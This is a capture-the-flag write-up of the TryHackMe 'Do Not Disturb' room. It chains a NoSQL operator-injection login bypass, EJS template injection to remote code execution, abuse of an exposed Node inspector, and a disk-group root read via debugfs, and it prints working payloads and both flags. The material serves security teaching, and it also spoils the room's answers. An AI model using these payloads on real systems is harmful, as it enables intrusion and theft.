| Field | Detail |
|------|--------|
| **Platform** | TryHackMe |
| **Event** | Hacker Holidays 2026 — The Byte Lotus |
| **Day** | 7 |
| **Room** | Do Not Disturb |
| **Category** | Boot2Root / NoSQLi → EJS SSTI → Node inspector → disk group |
| **Flag format** | `THM{...}` |

---

## Objective

**Do Not Disturb** is a Medium-rated Boot2Root box (90 pts) built around a Node.js/Express "Byte Lotus — Poolside" web app. The path to root chains four real-world server-side mistakes: a **NoSQL authentication bypass** (unsanitised JSON straight into a NeDB query), **server-side template injection** in an EJS-rendered "Cabana Desk" editor, an exposed **Node `--inspect` debugger** listening on loopback, and a service account left in the **`disk`** group. There are two flags to capture: the user flag and the root flag.

By the end of this room you will be able to:

- Enumerate a Node/Express target with **nmap** and **gobuster**, and recognise which endpoints are auth-gated
- Spot a **JSON API** hiding behind an HTML login form and exploit **NoSQL operator injection** (`{"$ne":"x"}`) for an auth bypass
- Identify and exploit **EJS server-side template injection (SSTI)** for remote code execution
- Understand why `require` is not always in scope and reach it via `process.mainModule.require` / `process.getBuiltinModule`
- Catch a second service via **pspy** and abuse an exposed **Node inspector** (`--inspect=127.0.0.1:9229`) for RCE as another user
- Escalate to `root` by using **`disk`-group** raw block-device access with `debugfs`

> **Authorisation warning:** The techniques below — directory brute-forcing, NoSQL injection, SSTI/RCE, reverse shells and privilege escalation — must only ever be run against systems you have **explicit authorization** to test, here the TryHackMe lab. Running them against systems you do not own or control is illegal.

---

## Story Hook

The room's briefing hides the whole kill chain in plain language: _"You have access you were never given, and so does he"_, _"a session goes warm on a sunbed, and a stranger sits down in it"_, _"whoever's already inside has been moving for far longer than you have"_ and _"Byte Lotus never forgets · Stay Noticed™"_.

Each phrase maps to a real step — the **warm session** is the NoSQL/session bypass that hands you a staff cookie, **someone already inside** is the already-running `pipelinesvc` inspector process moving before you arrived, and the **finish** is a raw-disk read straight off the block device.

---

## Attack Path

| **1** | **Recon**<br>`nmap` → 22 (OpenSSH 9.6p1, Ubuntu 24.04) + 80 (Node.js/Express, `X-Powered-By: Express`). The login page "Byte Lotus — Poolside" posts `username`/`password` to `/login`. `gobuster` finds `/logout` (302) and `/staff` (403, "Staff access only"). |
| --- | --- |

| **2** | **NoSQL auth bypass — the "warm session"**<br>`/login` also accepts a **JSON** body and returns JSON errors → operator injection. `{"username":"attendant","password":{"$ne":"x"}}` returns `200 {"ok":true,"role":"staff"}` and sets a signed `connect.sid` session cookie. (`attendant` = staff, `guest` = guest.) |
| --- | --- |

| **3** | **`/staff` → EJS SSTI**<br>With the staff session, `/staff` renders the **Cabana Desk** — a booking-confirmation **EJS template** editor posting to `/staff/preview`. EJS renders server-side, so `<%= 7*7 %>` → `49` confirms SSTI. |
| --- | --- |

| **4** | **RCE + user flag**<br>`require` isn't global in the page context, so use `process.mainModule.require('child_process')` / `execSync` for quick reads and **`exec` (async)** for the reverse shell. Land a shell as **`poolside`** (uid 996, `/opt/poolside`). User flag lives in `/opt/poolside`. |
| --- | --- |

| **5** | **Enumeration → open Node inspector — "someone already inside"**<br>`pspy64` reveals a second Node service run by uid 995: `/usr/bin/node --inspect=127.0.0.1:9229 processor.js` (`/opt/pipelinesvc/telemetry/processor.js`). The debug inspector is listening on `127.0.0.1:9229` = code exec as `pipelinesvc` for any local user. |
| --- | --- |

| **6** | **Node inspector RCE → `pipelinesvc`**<br>Connect to the inspector's WebSocket (Chrome DevTools Protocol) with a stdlib-only Python client and run `Runtime.evaluate`. `require` is undefined (ESM context), so use **`process.getBuiltinModule('child_process').execSync(...)`** (Node 22+) → code exec as **`pipelinesvc`** (uid 995). Output reveals `groups=995(pipelinesvc),6(disk)`. |
| --- | --- |

| **7** | **Privesc via `disk` group → root flag**<br>`pipelinesvc` is in the **`disk`** group = raw read/write to the root block device (`/dev/nvme0n1p1`). Read the flag straight off the raw filesystem, bypassing all permissions: `debugfs -R "cat /root/root.txt" /dev/nvme0n1p1`. |
| --- | --- |

---

## Walkthrough

### 1. Recon — nmap + gobuster

A service/script scan of the two open ports, then a directory brute-force. `nmap` confirms SSH and the Node/Express app; `gobuster` (raft-medium) maps the routes:

```bash
$ nmap -sC -sV -p22,80 10.146.155.176
# -> 22 OpenSSH 9.6p1 (Ubuntu 24.04); 80 Node.js (Express middleware), title "Byte Lotus — Poolside"
$ gobuster dir -u http://10.146.155.176 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
# -> /logout (Status: 302), /staff (Status: 403, "Staff access only"); everything else 404
```

`whatweb` confirmed `X-Powered-By: Express` and a `PasswordField[password]`. The static HTML login form posts `username`/`password` to `POST /login`.

### 2. NoSQL auth bypass — find the JSON API

Password guessing on `attendant` was a dead end by design. The turn came from switching the login request to `Content-Type: application/json`: the server answered with a **JSON** error, proving a JSON API sits behind the form and opening **NoSQL operator injection**. The auth-bypass payload replaces the password string with an operator object — the inline example `{"$ne":"x"}` ("not equal to x") always matches:

```json
{"username":"attendant","password":{"$ne":"x"}}
```

Sending a normal wrong password returns the JSON error; sending the operator object logs you in as `role: staff` and sets the `connect.sid` cookie:

```bash
$ curl -i -s -c cookies.txt http://10.146.155.176/login -H 'Content-Type: application/json' -d '{"username":"attendant","password":"wrong"}'
{"error":"Invalid credentials"}
$ curl -i -s -c cookies.txt http://10.146.155.176/login -H 'Content-Type: application/json' -d '{"username":"attendant","password":{"$ne":"x"}}'
{"ok":true,"role":"staff"}
```

A plain HTML form can't send a `{"$ne":...}` object, so from the browser DevTools console the same request was fired with `fetch` — the server set `connect.sid`, then `/staff` opened normally:

```javascript
fetch('/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:'attendant',password:{$ne:'x'}})})
```

### 3. `/staff` → EJS SSTI → RCE (user flag)

With the staff session, `/staff` rendered the **Cabana Desk**, a booking-confirmation **EJS template** editor posting to `/staff/preview`. Because EJS renders server-side, the classic probe `<%= 7*7 %>` returned `49` — confirmed SSTI.

`require` isn't global in the page context, so RCE went through `process.mainModule.require('child_process')` — `execSync` for quick reads, then `exec` (async) for the shell:

```javascript
process.mainModule.require('child_process').execSync('id')
```

The first reverse shell used `execSync`, which blocked Node's single thread and froze the whole web app (`Ctrl-C` killed the listener); the fix was to redeploy and use **`exec` (async)** for the shell. That landed a shell as **`poolside`** (uid 996) in `/opt/poolside`, where the user flag lives:

```bash
$ id
uid=996(poolside) gid=996(poolside) groups=996(poolside)
$ cat /opt/poolside/user.txt
THM{w4rm_s3ss10n_h1j4ck3d}
```

### 4. Enumeration → open Node inspector

A source read of `/opt/poolside/app.js` explained the foothold: session secret `byte-lotus-poolside`, seed users `guest:sunshine` (guest) and `attendant:<random hex>` (staff), and the backend is **NeDB** (`findOneAsync`), not Mongo — which is exactly why the operator injection worked. `sunshine` was not reused for any system user.

`pspy64` then exposed a second Node service running as uid 995 with its debug inspector listening on loopback:

```bash
$ ./pspy64
# CMD: UID=995 ... /usr/bin/node --inspect=127.0.0.1:9229 processor.js  (/opt/pipelinesvc/telemetry/processor.js)
```

A Node `--inspect` listener is full code execution as the service user for anyone with a local foothold — even bound to `127.0.0.1`.

### 5. Node inspector RCE → `pipelinesvc`

Connecting to the inspector's WebSocket (Chrome DevTools Protocol) with a stdlib-only Python client and issuing `Runtime.evaluate` gives arbitrary evaluation in the target process. `require` was undefined (ESM context), so the payload used `process.getBuiltinModule('child_process')` (Node 22+) to reach command execution as `pipelinesvc` — the output exposed the crucial group membership:

```javascript
process.getBuiltinModule('child_process').execSync('id').toString()
```

```bash
uid=995(pipelinesvc) gid=995(pipelinesvc) groups=995(pipelinesvc),6(disk)
```

### 6. Privesc via `disk` group → root flag

`pipelinesvc` is in the **`disk`** group, which grants raw read/write to the root block device — so the root flag can be read straight off the raw filesystem, bypassing every file permission. `df`/`lsblk` showed the root partition is `/dev/nvme0n1p1`, and `debugfs` reads the file directly:

```bash
$ debugfs -R "cat /root/root.txt" /dev/nvme0n1p1
THM{r4w_d1sk_4cc3ss_w4s_t00_much}
```

---

## Exploration Log

What actually happened, dead ends included — the misfires are as instructive as the wins:

1. **Recon.** `nmap -sC -sV -p22,80` → OpenSSH 9.6p1 (Ubuntu 24.04) + `Node.js (Express middleware)`, title "Byte Lotus — Poolside". `whatweb` confirmed `X-Powered-By: Express`, `PasswordField[password]`.
2. **Login page.** Static HTML form → `POST /login` with `username`/`password`. The page CSS styled a `textarea` and a `pre` block that weren't on the login page — a tell that an authenticated page with a text box + rendered-output area existed.
3. **Dir enum.** `gobuster` (raft-medium) → `/logout` (302) and `/staff` (403, body "Staff access only"). Everything else 404.
4. **Dead ends:**
   - Password guessing on `attendant` (`attendant`, `password`, `poolside`, `bytelotus`, …) → all `401`. **By design** — `attendant`'s real password was `crypto.randomBytes(18)` per the later source read.
   - No session cookie was issued by `/` or by a failed login, so there was nothing to tamper yet.
   - Source/secret probing (`.env`, `package.json`, `server.js`, `.git/HEAD`, `robots.txt`, …) → all 404.
   - `X-Forwarded-For: 127.0.0.1` on `/staff` → still 403.
5. **The turn:** sending the login as `Content-Type: application/json` returned `{"error":"Invalid credentials"}` (JSON) — proving a JSON API and opening **NoSQL operator injection**. `{"password":{"$ne":"x"}}` logged in as `role: staff`.
6. **UI method:** since a plain HTML form can't send a `{"$ne":...}` object, logged in from the browser DevTools console with `fetch`, the server set `connect.sid`, and `/staff` opened with the EJS textarea usable directly.
7. **SSTI foothold:** `<%= 7*7 %>` → `49`; `execSync('id')` → shell as `poolside`.
8. **Mistake / recovery:** first reverse shell used **`execSync`**, which blocked Node's single thread and froze the whole web app; `Ctrl-C` killed the listener. Fix = terminate/redeploy the box and use **`exec` (async)** for the shell.
9. **Source read (`/opt/poolside/app.js`):** session secret `byte-lotus-poolside`, seed users `guest:sunshine` (guest) and `attendant:<random hex>` (staff), backend = **NeDB** (`findOneAsync`), not Mongo. `sunshine` was **not** reused for any system user (tested `su` for root/ubuntu/pipelinesvc → all failed).
10. **Privesc recon:** real-shell users = `root`, `ubuntu`, plus service accounts `poolside` (996) and `pipelinesvc` (995). `pspy64` exposed the `--inspect=127.0.0.1:9229 processor.js` service as uid 995 → the intended vector.
11. **Inspector RCE gotcha:** `require is not defined` (ESM) — switched to `process.getBuiltinModule('child_process')`; RCE as `pipelinesvc` revealed the `disk` group membership.
12. **Root:** `debugfs -R "cat /root/root.txt" /dev/nvme0n1p1` → root flag. (`/dev/root` → `nvme0n1p1` from `df`/`lsblk`.)

---

## Flag

> **🚩 Flag**
>
> **User flag:** `THM{w4rm_s3ss10n_h1j4ck3d}`
>
> **Root flag:** `THM{r4w_d1sk_4cc3ss_w4s_t00_much}`

### Key host facts

| Item | Value |
|---|---|
| **App (foothold)** | Express + **NeDB** at `/opt/poolside/app.js`, run as `poolside` (uid 996) |
| **Auth-bypass sink** | `db.findOneAsync({ username, password })` with unsanitised JSON → `{"$ne":"x"}` |
| **RCE sink** | EJS template rendered from user input at `POST /staff/preview` |
| **Privesc service** | `node --inspect=127.0.0.1:9229 /opt/pipelinesvc/telemetry/processor.js` as `pipelinesvc` (uid 995) |
| **Root primitive** | `pipelinesvc` ∈ `disk` group → `debugfs` raw read of `/dev/nvme0n1p1` |
| **Session secret** | `byte-lotus-poolside` (in `app.js`) |

---

## Key Takeaways

- Never pass user input straight into a Mongo/NeDB query object — cast credential fields to strings so `{"$ne":...}`/`{"$gt":...}` operators can't be injected (NoSQL auth bypass).
- Never render user-controlled templates with a server-side engine (`ejs.render` on attacker input = RCE). Treat the message body as data, not a template.
- Never expose the Node **`--inspect`** debugger in production — even bound to `127.0.0.1` it is full RCE as the service user for any local foothold. Remove `--inspect`/`--inspect-brk` from prod launch args.
- The **`disk`** group is effectively root — it grants raw block-device access (`debugfs`/`dd`) to read/write any file including `/root` and `/etc/shadow`. Never add a service account to `disk`.
- On a single-threaded Node target, use `exec()` (async) for shells — `execSync()` on a long-running reverse shell freezes the entire event loop and hangs the whole app.

---

## Final Takeaway

Do Not Disturb is a masterclass in server-side trust boundaries falling one after another. The foothold is a **NoSQL authentication bypass** — the `/login` route quietly accepts JSON and feeds it unsanitised into a **NeDB** query, so a `{"$ne":"x"}` operator object turns "check the password" into "match anything" and hands you a signed staff **session**. That session unlocks an **EJS SSTI** sink where a user-controlled template renders server-side (`<%= 7*7 %>` → `49`), and reaching `child_process` through `process.mainModule.require` escalates it to remote code execution as `poolside`. Enumeration with **pspy** then exposes an even sharper mistake — a Node **`--inspect`** debugger listening on loopback, which is full code execution as `pipelinesvc` for any local user via `process.getBuiltinModule`. The finish is the oldest lesson of all: `pipelinesvc` sits in the **`disk`** group, so `debugfs` reads `/root/root.txt` straight off `/dev/nvme0n1p1`, bypassing every permission. The recurring theme is that **untrusted input** must never become a query, a template, or a debugger port — and a privileged **group** membership can quietly equal root.

---
*Adapted from the [Hacker Holidays 2026 findings log](https://github.com/Varun-Patkar/HackerHolidays) by Varun Anand Patkar (MIT License).*
